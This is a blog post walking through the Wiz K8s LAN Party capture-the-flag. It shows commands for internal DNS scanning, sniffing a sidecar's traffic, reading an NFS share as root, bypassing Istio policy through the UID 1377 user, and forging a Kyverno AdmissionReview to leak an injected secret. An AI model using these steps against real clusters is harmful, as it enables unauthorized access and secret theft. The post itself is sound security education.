<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Sally"><title>ä»k8s-dns-ctfçœ‹äº‘åŸç”Ÿå®‰å…¨ Â· Sally's Blog</title><meta name="description" content="Wiz-k8slanparty1. ç¬¬ä¸€éƒ¨åˆ†DNSing with the stars ä¸æ˜Ÿæ˜Ÿè¿›è¡Œ DNS è§£æYou have shell access to compromised a Kubernetes pod at the bottom of this page, and your nex"><meta name="keywords" content="Blog,åšå®¢,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.webp"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">ä¸»é¡µ</a></li><li> <a href="/archives">å½’æ¡£</a></li><li> <a href="/tags">æ ‡ç­¾</a></li><li> <a href="/about">å…³äº</a></li><li> <a href="/links">å‹é“¾</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/kabi.jpg"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/kabi.jpg" style="width:220px;" alt="favicon"><h3 title=""><a href="/">Sally's Blog</a></h3><div class="description"><p>A simple and beautiful blog</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/phoenixmerk"><i class="fa fa-github"></i></a></li><li><a href="mailto:yourname@example.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://zhihu.com/people/jin-xin-4-68"><i class="fa fa-mortar-board"></i></a></li></ul><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="220" height="86" src="//music.163.com/outchain/player?type=2&amp;id=1293913379&amp;auto=1&amp;height=66&amp;&amp;loop=1"></iframe></div></div><div class="footer"><div class="p"> <span> å…¨ç«™CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> Sally</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>ä»k8s-dns-ctfçœ‹äº‘åŸç”Ÿå®‰å…¨</a></h3></div><div class="post-content"><p><p><a href="https://phoenixmerk.github.io/"><img src="https://img.shields.io/badge/%E4%BD%9C%E8%80%85-phoenixmerk-blue.svg" alt="img"></a></p>
<h1 id="Wiz-k8slanparty"><a href="#Wiz-k8slanparty" class="headerlink" title="Wiz-k8slanparty"></a>Wiz-k8slanparty</h1><h2 id="1-ç¬¬ä¸€éƒ¨åˆ†"><a href="#1-ç¬¬ä¸€éƒ¨åˆ†" class="headerlink" title="1. ç¬¬ä¸€éƒ¨åˆ†"></a>1. ç¬¬ä¸€éƒ¨åˆ†</h2><h3 id="DNSing-with-the-stars-ä¸æ˜Ÿæ˜Ÿè¿›è¡Œ-DNS-è§£æ"><a href="#DNSing-with-the-stars-ä¸æ˜Ÿæ˜Ÿè¿›è¡Œ-DNS-è§£æ" class="headerlink" title="DNSing with the stars ä¸æ˜Ÿæ˜Ÿè¿›è¡Œ DNS è§£æ"></a>DNSing with the stars ä¸æ˜Ÿæ˜Ÿè¿›è¡Œ DNS è§£æ</h3><p>You have shell access to compromised a Kubernetes pod at the bottom of this page, and your next objective is to compromise other internal services further.</p>
<p>As a warmup, utilize <a target="_blank" rel="noopener" href="https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html#kubernetes-dns-to-the-partial-rescue">DNS scanning</a> to uncover hidden internal services and obtain the flag. We have â€œloaded your machine with <a target="_blank" rel="noopener" href="https://gist.github.com/nirohfeld/c596898673ead369cb8992d97a1c764e">dnscan</a> to ease this process for further challenges.</p>
<p>æ‚¨å¯ä»¥é€šè¿‡ shell è®¿é—®æœ¬é¡µåº•éƒ¨çš„å—æ„ŸæŸ“ Kubernetes podï¼Œæ‚¨çš„ä¸‹ä¸€ä¸ªç›®æ ‡æ˜¯è¿›ä¸€æ­¥å±å®³å…¶ä»–å†…éƒ¨æœåŠ¡ã€‚</p>
<p>ä½œä¸ºçƒ­èº«ï¼Œåˆ©ç”¨ DNS æ‰«ææ¥å‘ç°éšè—çš„å†…éƒ¨æœåŠ¡å¹¶è·å–æ ‡å¿—ã€‚æˆ‘ä»¬å·²â€œåœ¨æ‚¨çš„æœºå™¨ä¸ŠåŠ è½½äº† dnscanï¼Œä»¥ç®€åŒ–æ­¤è¿‡ç¨‹ä»¥åº”å¯¹è¿›ä¸€æ­¥çš„æŒ‘æˆ˜ã€‚</p>
<h3 id="1-1-æŸ¥çœ‹ç¯å¢ƒå˜é‡"><a href="#1-1-æŸ¥çœ‹ç¯å¢ƒå˜é‡" class="headerlink" title="1.1 æŸ¥çœ‹ç¯å¢ƒå˜é‡"></a>1.1 æŸ¥çœ‹ç¯å¢ƒå˜é‡</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">env</span></span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240404162220576.png" alt="image-20240404162220576"></p>
<h3 id="1-2-ä½¿ç”¨dnscanæ‰«æ"><a href="#1-2-ä½¿ç”¨dnscanæ‰«æ" class="headerlink" title="1.2 ä½¿ç”¨dnscanæ‰«æ"></a>1.2 ä½¿ç”¨dnscanæ‰«æ</h3><p>å‘ç°å…¶ä¸º10.100æ®µï¼Œæˆ‘ä»¬ä½¿ç”¨dnscanè¿›è¡Œæ‰«æ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnscan -subnet 10.100.0.0/16</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240404162707141.png" alt="image-20240404162707141"></p>
<p>æ‰«æåˆ°äº†å…³é”®æœåŠ¡getflag-serviceå’Œå†…éƒ¨IP10.100.136.254ï¼Œæˆ‘ä»¬ä½¿ç”¨curlè®¿é—®çœ‹çœ‹åˆ™è·å¾—flag</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240404162834200.png" alt="image-20240404162834200"></p>
<h2 id="2-ç¬¬äºŒéƒ¨åˆ†"><a href="#2-ç¬¬äºŒéƒ¨åˆ†" class="headerlink" title="2. ç¬¬äºŒéƒ¨åˆ†"></a>2. ç¬¬äºŒéƒ¨åˆ†</h2><h3 id="Helloï¼Ÿä½ å¥½ï¼Ÿ"><a href="#Helloï¼Ÿä½ å¥½ï¼Ÿ" class="headerlink" title="Helloï¼Ÿä½ å¥½ï¼Ÿ"></a>Helloï¼Ÿä½ å¥½ï¼Ÿ</h3><p>Sometimes, it seems we are the only ones around, but we should always be on guard against invisible <a target="_blank" rel="noopener" href="https://kubernetes.io/docs/concepts/workloads/pods/sidecar-containers/">sidecars</a> reporting sensitive secrets.</p>
<p>æœ‰æ—¶ï¼Œæˆ‘ä»¬ä¼¼ä¹æ˜¯å‘¨å›´å”¯ä¸€çš„äººï¼Œä½†æˆ‘ä»¬åº”è¯¥æ—¶åˆ»è­¦æƒ•éšå½¢çš„ sidecar æŠ¥å‘Šæ•æ„Ÿç§˜å¯†ã€‚</p>
<h3 id="1-1-ä½¿ç”¨dnscanæ‰«æ"><a href="#1-1-ä½¿ç”¨dnscanæ‰«æ" class="headerlink" title="1.1 ä½¿ç”¨dnscanæ‰«æ"></a>1.1 ä½¿ç”¨dnscanæ‰«æ</h3><p>å‘ç°äº†sidecaræœåŠ¡ï¼Œè¿™åŒæ—¶ä¹Ÿè¯æ˜å½“å‰podå­˜åœ¨ç€ä¸€ä¸ªâ€œé‚»å±…â€ï¼Œå®ƒå…±äº«ç€ä½ çš„ç½‘ç»œå’Œå­˜å‚¨ã€‚</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240404165225554.png" alt="image-20240404165225554"></p>
<h3 id="1-2-ä½¿ç”¨tcpdumpæŸ¥çœ‹ç½‘å¡é€šä¿¡"><a href="#1-2-ä½¿ç”¨tcpdumpæŸ¥çœ‹ç½‘å¡é€šä¿¡" class="headerlink" title="1.2 ä½¿ç”¨tcpdumpæŸ¥çœ‹ç½‘å¡é€šä¿¡"></a>1.2 ä½¿ç”¨tcpdumpæŸ¥çœ‹ç½‘å¡é€šä¿¡</h3><p>å‘ç°é€šä¿¡è¿‡ç¨‹ä¸­åŒ…å«flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -X</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240404165421962.png" alt="image-20240404165421962"></p>
<h2 id="3-ç¬¬ä¸‰éƒ¨åˆ†"><a href="#3-ç¬¬ä¸‰éƒ¨åˆ†" class="headerlink" title="3. ç¬¬ä¸‰éƒ¨åˆ†"></a>3. ç¬¬ä¸‰éƒ¨åˆ†</h2><h3 id="Exposed-File-Share-æš´éœ²çš„æ–‡ä»¶å…±äº«"><a href="#Exposed-File-Share-æš´éœ²çš„æ–‡ä»¶å…±äº«" class="headerlink" title="Exposed File Share æš´éœ²çš„æ–‡ä»¶å…±äº«"></a>Exposed File Share æš´éœ²çš„æ–‡ä»¶å…±äº«</h3><p>The targeted big corp utilizes outdated, yet cloud-supported technology for data storage in production. But oh my, this technology was introduced in an era when access control was only network-based ğŸ¤¦â€ï¸.</p>
<p>ç›®æ ‡å¤§å…¬å¸åœ¨ç”Ÿäº§ä¸­ä½¿ç”¨è¿‡æ—¶ä½†æ”¯æŒäº‘çš„æŠ€æœ¯è¿›è¡Œæ•°æ®å­˜å‚¨ã€‚ä½†æ˜¯å¤©å“ªï¼Œè¿™é¡¹æŠ€æœ¯æ˜¯åœ¨è®¿é—®æ§åˆ¶ä»…åŸºäºç½‘ç»œçš„æ—¶ä»£å¼•å…¥çš„ğŸ¤¦â€ï¸ã€‚</p>
<h3 id="1-1-å¯»æ‰¾æ–‡ä»¶å…±äº«"><a href="#1-1-å¯»æ‰¾æ–‡ä»¶å…±äº«" class="headerlink" title="1.1 å¯»æ‰¾æ–‡ä»¶å…±äº«"></a>1.1 å¯»æ‰¾æ–‡ä»¶å…±äº«</h3><p>ä½¿ç”¨mountå‘½ä»¤æŸ¥çœ‹ï¼Œå‘ç°é™¤äº†overlayå¤–è¿˜æœ‰ä¸€ä¸ªefsæ–‡ä»¶æŒ‚è½½ï¼Œä»ä¸­å¯ä»¥çŸ¥é“æŒ‚è½½ç‚¹åœ¨&#x2F;efsã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240404225814855.png" alt="image-20240404225814855"></p>
<p>æŸ¥çœ‹&#x2F;efsä¸‹æ–‡ä»¶ï¼Œå‘ç°flagä½†æ²¡æƒé™è¯»</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /efs</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240404225926154.png" alt="image-20240404225926154"></p>
<h3 id="1-2-å¦‚ä½•ææƒ"><a href="#1-2-å¦‚ä½•ææƒ" class="headerlink" title="1.2 å¦‚ä½•ææƒ"></a>1.2 å¦‚ä½•ææƒ</h3><p>æˆ‘ä»¬çŸ¥é“nfså¯èƒ½é…ç½®no_root_squashï¼Œè¿™æ˜¯å…è®¸æˆ‘ä»¬é€šè¿‡æœåŠ¡å™¨ä»¥rootæƒé™è¯»å–æ–‡ä»¶çš„ï¼Œå°è¯•ä½¿ç”¨nfs-catçœ‹èƒ½ä¸èƒ½ä»æœåŠ¡å™¨è¯»ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nfs-cat <span class="string">&quot;nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4&amp;uid=0&amp;gid=0&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240404230116167.png" alt="image-20240404230116167"></p>
<h2 id="3-ç¬¬ä¸‰éƒ¨åˆ†-1"><a href="#3-ç¬¬ä¸‰éƒ¨åˆ†-1" class="headerlink" title="3. ç¬¬ä¸‰éƒ¨åˆ†"></a>3. ç¬¬ä¸‰éƒ¨åˆ†</h2><h3 id="The-Beauty-and-The-Ist-ç¾ä¸å®"><a href="#The-Beauty-and-The-Ist-ç¾ä¸å®" class="headerlink" title="The Beauty and The Ist ç¾ä¸å®"></a>The Beauty and The Ist ç¾ä¸å®</h3><p>Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Donâ€™t abuse this power; use it responsibly and with caution.</p>
<p>æ˜¾ç„¶ï¼Œæ–°çš„æœåŠ¡ç½‘æ ¼æŠ€æœ¯å¯¹è¶…çº§ç²¾è‹±ç”¨æˆ·ï¼ˆrootç”¨æˆ·ï¼‰å…·æœ‰ç‹¬ç‰¹çš„å¸å¼•åŠ›ã€‚è¯·å‹¿æ»¥ç”¨æ­¤æƒåŠ›ï¼›è´Ÿè´£ä»»ä¸”è°¨æ…åœ°ä½¿ç”¨å®ƒã€‚</p>
<h3 id="1-1-æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™"><a href="#1-1-æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™" class="headerlink" title="1.1 æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™"></a>1.1 æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">security.istio.io/v1beta1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">AuthorizationPolicy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">istio-get-flag</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">k8s-lan-party</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">action:</span> <span class="string">DENY</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">&quot;&#123;flag-pod-name&#125;&quot;</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">from:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">source:</span></span><br><span class="line">        <span class="attr">namespaces:</span> [<span class="string">&quot;k8s-lan-party&quot;</span>]</span><br><span class="line">    <span class="attr">to:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">operation:</span></span><br><span class="line">        <span class="attr">methods:</span> [<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;GET&quot;</span>]</span><br></pre></td></tr></table></figure>

<ol>
<li>å¦‚æœä½ çš„è¯·æ±‚æ¥è‡ª <code>k8s-lan-party</code> å‘½åç©ºé—´ï¼Œå¹¶ä¸”ä½¿ç”¨äº† <code>POST</code> æˆ– <code>GET</code> æ–¹æ³•ï¼Œé‚£ä¹ˆä½ çš„è¯·æ±‚å°†è¢«å…è®¸é€šè¿‡ã€‚</li>
<li>é™¤éä½ çš„è¯·æ±‚æ¥è‡ª <code>k8s-lan-party</code> å‘½åç©ºé—´ä¸”æ–¹æ³•ä¸º <code>POST</code> æˆ– <code>GET</code>ï¼Œå¦åˆ™ä»»ä½•æ¥è‡ªæ ‡ç­¾åŒ¹é…ä¸º <code>app: &quot;&#123;flag-pod-name&#125;&quot;</code> çš„ Pod çš„è¯·æ±‚éƒ½å°†è¢«æ‹’ç»ã€‚</li>
</ol>
<h3 id="1-2-ä½¿ç”¨dnsæ‰«æ"><a href="#1-2-ä½¿ç”¨dnsæ‰«æ" class="headerlink" title="1.2 ä½¿ç”¨dnsæ‰«æ"></a>1.2 ä½¿ç”¨dnsæ‰«æ</h3><p>æˆ‘ä»¬ä½¿ç”¨dnscanè¿›è¡Œæ‰«æï¼Œå‘ç°istioæœåŠ¡ï¼Œä½†æƒé™ä¸å¤Ÿ</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnscan -subnet 10.100.0.0/16</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240405102135213.png" alt="image-20240405102135213"></p>
<h3 id="1-3-åˆ©ç”¨1377-UID-bypass"><a href="#1-3-åˆ©ç”¨1377-UID-bypass" class="headerlink" title="1.3 åˆ©ç”¨1377 UID bypass"></a>1.3 åˆ©ç”¨1377 UID bypass</h3><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://istio.io/latest/blog/2021/ncc-security-assessment/NCC_Group_Google_GOIST2005_Report_2020-08-06_v1.1.pdf">https://istio.io/latest/blog/2021/ncc-security-assessment/NCC_Group_Google_GOIST2005_Report_2020-08-06_v1.1.pdf</a></p>
<p>æŸ¥çœ‹ä¸€ä¸‹rootçš„æƒé™ï¼Œä¹Ÿå°±åªæœ‰cap_setgidå’Œcap_setuidï¼Œä¸è¿‡åˆšå¥½å¯ä»¥ä½¿ç”¨æ¥bypassã€‚</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240405113243258.png" alt="image-20240405113243258"></p>
<p>æˆ‘ä»¬æŸ¥çœ‹ä¸€ä¸‹ç”¨æˆ·ï¼Œåˆ©ç”¨uidä¸º1377çš„istioç”¨æˆ·å¯ä»¥å®ç°ç»•è¿‡RBACè®¿é—®istioæœåŠ¡ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240405102310097.png" alt="image-20240405102310097"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su istio <span class="comment"># åˆ‡æ¢åˆ°istioç”¨æˆ·</span></span><br><span class="line">curl istio-protected-pod-service.k8s-lan-party.svc.cluster.local.</span><br></pre></td></tr></table></figure>

<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240405102429900.png" alt="image-20240405102429900"></p>
<h2 id="4-ç¬¬å››éƒ¨åˆ†"><a href="#4-ç¬¬å››éƒ¨åˆ†" class="headerlink" title="4. ç¬¬å››éƒ¨åˆ†"></a>4. ç¬¬å››éƒ¨åˆ†</h2><h3 id="Who-will-guard-the-guardians-è°æ¥å®ˆæŠ¤å®ˆæŠ¤è€…ï¼Ÿ"><a href="#Who-will-guard-the-guardians-è°æ¥å®ˆæŠ¤å®ˆæŠ¤è€…ï¼Ÿ" class="headerlink" title="Who will guard the guardians? è°æ¥å®ˆæŠ¤å®ˆæŠ¤è€…ï¼Ÿ"></a>Who will guard the guardians? è°æ¥å®ˆæŠ¤å®ˆæŠ¤è€…ï¼Ÿ</h3><p>Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the <a target="_blank" rel="noopener" href="https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/#request">administrative</a> services.</p>
<p>å½“ Pod å—åˆ°å¤–éƒ¨æ”¿æƒçš„å˜å¼‚æ—¶ï¼Œå¯ä»¥æ»¥ç”¨å…¶å®˜åƒšæœºæ„å¹¶ä»ç®¡ç†æœåŠ¡ä¸­æ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚</p>
<h3 id="1-1-æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™-1"><a href="#1-1-æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™-1" class="headerlink" title="1.1 æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™"></a>1.1 æŸ¥çœ‹æˆ‘ä»¬çš„æƒé™</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">kyverno.io/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Policy</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">apply-flag-to-env</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">sensitive-ns</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">rules:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">inject-env-vars</span></span><br><span class="line">      <span class="attr">match:</span></span><br><span class="line">        <span class="attr">resources:</span></span><br><span class="line">          <span class="attr">kinds:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Pod</span></span><br><span class="line">      <span class="attr">mutate:</span></span><br><span class="line">        <span class="attr">patchStrategicMerge:</span></span><br><span class="line">          <span class="attr">spec:</span></span><br><span class="line">            <span class="attr">containers:</span></span><br><span class="line">              <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">                <span class="attr">env:</span></span><br><span class="line">                  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">FLAG</span></span><br><span class="line">                    <span class="attr">value:</span> <span class="string">&quot;&#123;flag&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>è¿™é‡Œå°†flagå†™å…¥äº†æ¯ä¸ªsensitive-nså‘½åç©ºé—´çš„podçš„envä¸­</li>
</ul>
<h3 id="1-2-ä½¿ç”¨dnscanæ‰«æ-1"><a href="#1-2-ä½¿ç”¨dnscanæ‰«æ-1" class="headerlink" title="1.2 ä½¿ç”¨dnscanæ‰«æ"></a>1.2 ä½¿ç”¨dnscanæ‰«æ</h3><p>å¯ä»¥çœ‹åˆ°kyvernoæœåŠ¡å’Œ5ä¸ªmetricsæœåŠ¡</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240405110128178.png" alt="image-20240405110128178"></p>
<h3 id="1-3-ä½¿ç”¨mutateç«¯ç‚¹å‘é€åˆ›å»ºpodè¯·æ±‚"><a href="#1-3-ä½¿ç”¨mutateç«¯ç‚¹å‘é€åˆ›å»ºpodè¯·æ±‚" class="headerlink" title="1.3 ä½¿ç”¨mutateç«¯ç‚¹å‘é€åˆ›å»ºpodè¯·æ±‚"></a>1.3 ä½¿ç”¨mutateç«¯ç‚¹å‘é€åˆ›å»ºpodè¯·æ±‚</h3><p>ç”±äºsensitive-nså‘½åç©ºé—´ä¸­æ¯ä¸ªpodçš„envéƒ½ä¼šè¢«å†™å…¥flagï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªç«¯ç‚¹æ¥åˆ›å»ºä¸€ä¸ªpodã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -k -X POST https://kyverno-svc.kyverno.svc.cluster.local./mutate -H <span class="string">&quot;Content-Type: application/json&quot;</span> --data <span class="string">&#x27;&#123;&quot;apiVersion&quot;:&quot;admission.k8s.io/v1&quot;,&quot;kind&quot;:&quot;AdmissionReview&quot;,&quot;request&quot;:&#123;&quot;uid&quot;:&quot;705ab4f5-6393-11e8-b7cc-42010a800002&quot;,&quot;kind&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;&#125;,&quot;resource&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;resource&quot;:&quot;pods&quot;&#125;,&quot;requestKind&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;&#125;,&quot;requestResource&quot;:&#123;&quot;group&quot;:&quot;&quot;,&quot;version&quot;:&quot;v1&quot;,&quot;resource&quot;:&quot;pods&quot;&#125;,&quot;name&quot;:&quot;example-pod&quot;,&quot;namespace&quot;:&quot;sensitive-ns&quot;,&quot;operation&quot;:&quot;CREATE&quot;,&quot;userInfo&quot;:&#123;&quot;username&quot;:&quot;admin&quot;,&quot;uid&quot;:&quot;014fbff9a07c&quot;,&quot;groups&quot;:[&quot;system:authenticated&quot;]&#125;,&quot;object&quot;:&#123;&quot;apiVersion&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;,&quot;metadata&quot;:&#123;&quot;name&quot;:&quot;example-pod&quot;,&quot;namespace&quot;:&quot;sensitive-ns&quot;&#125;,&quot;spec&quot;:&#123;&quot;containers&quot;:[&#123;&quot;name&quot;:&quot;example-container&quot;,&quot;image&quot;:&quot;nginx&quot;,&quot;env&quot;:[&#123;&quot;name&quot;:&quot;FLAG&quot;,&quot;value&quot;:&quot;&#123;flag&#125;&quot;&#125;]&#125;]&#125;&#125;,&quot;oldObject&quot;:null,&quot;options&quot;:&#123;&quot;apiVersion&quot;:&quot;meta.k8s.io/v1&quot;,&quot;kind&quot;:&quot;CreateOptions&quot;&#125;,&quot;dryRun&quot;:true&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>patchæ®µbase64è§£ç åå³å¯è·å¾—flag</p>
<p><img src="https://safedog-hq.oss-cn-guangzhou.aliyuncs.com/metarget/image-20240405110750755.png" alt="image-20240405110750755"></p>
</p><div class="tip">æœ¬æ–‡é‡‡ç”¨CC-BY-SA-3.0åè®®ï¼Œè½¬è½½è¯·æ³¨æ˜å‡ºå¤„<br>Author: Sally</div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2024-04-04</span><i class="fa fa-tag"></i><a class="tag" href="/tags/å®¹å™¨å®‰å…¨/" title="å®¹å™¨å®‰å…¨">å®¹å™¨å®‰å…¨ </a><span class="leancloud_visitors"></span><span>About 1461 words, 4 min 52 sec  read</span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,https://phoenixmerk.github.io/2024/04/04/ä»K8S-DNS-CTFçœ‹äº‘åŸç”Ÿå®‰å…¨/,Sally's Blog,ä»k8s-dns-ctfçœ‹äº‘åŸç”Ÿå®‰å…¨,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2024/07/27/%E4%BB%8Eprompt-airlines%E7%9C%8B%E5%A4%A7%E6%A8%A1%E5%9E%8B%E8%B6%8A%E7%8B%B1/" title="ä»prompt-airlinesçœ‹å¤§æ¨¡å‹è¶Šç‹±">Previous</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2024/04/02/%E4%BB%8EIAM-CTF%E7%9C%8B%E4%BA%91%E8%BA%AB%E4%BB%BD%E5%AE%89%E5%85%A8/" title="ä»IAM-CTFçœ‹äº‘èº«ä»½å®‰å…¨">Next</a></li></ul></div><script src="/js/visitors.js"></script></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script 